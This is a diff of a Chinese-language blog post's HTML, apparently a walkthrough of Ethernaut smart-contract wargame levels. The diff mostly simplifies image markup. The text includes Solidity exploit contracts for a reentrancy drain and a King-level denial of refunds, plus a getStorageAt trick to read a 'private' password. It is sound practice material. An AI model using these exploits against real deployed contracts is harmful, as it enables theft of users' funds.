+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/34.jpg" alt="34"></div>
 
 <p>3.再调用<code>attack</code>函数进行转钱</p>
 <p>3.点击<code>submit instance</code>即可过关。</p>
@@ -567,22 +412,10 @@
 <h3 id="预备知识-5"><a href="#预备知识-5" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了<code>private</code>，该信息依然是公开的，可以随时被别人查看。</p>
 <h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.通过读取区块链上的块中的信息获取<code>password</code><br>2.用该<code>password</code>作为参数调用<code>unlock</code>函数进行解锁</p>
 <h3 id="具体步骤-7"><a href="#具体步骤-7" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.通过<code>web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))</code>指令查看<code>password</code></p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/35.jpg" alt="35" title="">
-                </div>
-                <div class="image-caption">35</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/35.jpg" alt="35"></div>
 
 <p>2.将<code>password</code>传入<code>unlock</code>函数</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/36.jpg" alt="36" title="">
-                </div>
-                <div class="image-caption">36</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/36.jpg" alt="36"></div>
 
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-8"><a href="#通关后的彩蛋-8" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -599,22 +432,10 @@
 <h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.由于最后合约<code>owner</code>会调用<code>fallback</code>函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止<code>transfer</code><br>2.我们可以自己写个合约并将<code>fallback</code>函数设为<code>revert()</code>，这样就没有人可以通过<code>transfer()</code>打钱给我们。当然我们甚至可以不写<code>fallback</code>函数也可以实现这个效果</p>
 <h3 id="具体步骤-8"><a href="#具体步骤-8" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">    function exp() public payable &#123;</span><br><span class="line">        address attackAddr = <span class="number">0x529c6e4d28d24af49eada89a2f7effa44c8f58c3</span>; </span><br><span class="line">        attackAddr.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.部署合约，注意要传入比原先的<code>1ETH</code>多</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/37.jpg" alt="37" title="">
-                </div>
-                <div class="image-caption">37</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/37.jpg" alt="37"></div>
 
 <p>3.查看king可以发现king已经变成了我们部署的合约的地址</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/38.jpg" alt="38" title="">
-                </div>
-                <div class="image-caption">38</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/38.jpg" alt="38"></div>
 
 <p>4.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-9"><a href="#通关后的彩蛋-9" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -625,37 +446,13 @@
 <h3 id="胜利条件-9"><a href="#胜利条件-9" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.将合约中的所有钱卷走</p>
 <h3 id="tips-6"><a href="#tips-6" class="headerlink" title="tips"></a>tips</h3><p>1.不可信的合约可以执行人们不希望出现的代码<br>2.<code>Fallback</code>方法<br>3.<code>Throw/revert bubbling</code><br>4.用其他合约去攻击这个合约<br>5.用<code>Remix</code>或<code>Truffle</code></p>
 <h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一个比较著名的重入漏洞，漏洞点在<code>withdraw</code>，它会先判断账户是否有那么多余额在调用<code>call</code>进行转账，然后再将<code>balances</code>中的金额减少。<br>但是我们前面说过<code>call</code>过去的地址如果是个合约地址，并且合约的<code>fallback</code>函数也调用了<code>withdraw</code>函数，那么这就会成为一个递归问题，一直到<code>gas=0</code>才会停止。<br>div style=”width: 50%; margin: auto”&gt;<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/39.jpg" alt="39" title="">
-                </div>
-                <div class="image-caption">39</div>
-            </figure><br>所以我们可以利用这个机制编写合约将钱全部提出。</p>
+<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一个比较著名的重入漏洞，漏洞点在<code>withdraw</code>，它会先判断账户是否有那么多余额在调用<code>call</code>进行转账，然后再将<code>balances</code>中的金额减少。<br>但是我们前面说过<code>call</code>过去的地址如果是个合约地址，并且合约的<code>fallback</code>函数也调用了<code>withdraw</code>函数，那么这就会成为一个递归问题，一直到<code>gas=0</code>才会停止。<br>div style=”width: 50%; margin: auto”&gt;<img src="/2019/01/08/ethernautd训练/39.jpg" alt="39"><br>所以我们可以利用这个机制编写合约将钱全部提出。</p>
 <h3 id="具体步骤-9"><a href="#具体步骤-9" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0xdc8941b8396a3140b008d124fcd149acd2005eff</span>;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function exp() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        //同理写两次</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.调用<code>donate</code>方法捐款<code>2ETH</code></p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/40.jpg" alt="40" title="">
-                </div>
-                <div class="image-caption">40</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/40.jpg" alt="40"></div>
 
 <p>3.调用<code>attack</code>方法进行攻击，可以看见钱全部在我们这里并且整数溢出了</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/41.jpg" alt="41" title="">
-                </div>
-                <div class="image-caption">41</div>
-            </figure></div><br>攻击后的结果<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/42.jpg" alt="42" title="">
-                </div>
-                <div class="image-caption">42</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/41.jpg" alt="41"></div><br>攻击后的结果<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/42.jpg" alt="42"></div>
 
 <p>4.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-10"><a href="#通关后的彩蛋-10" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
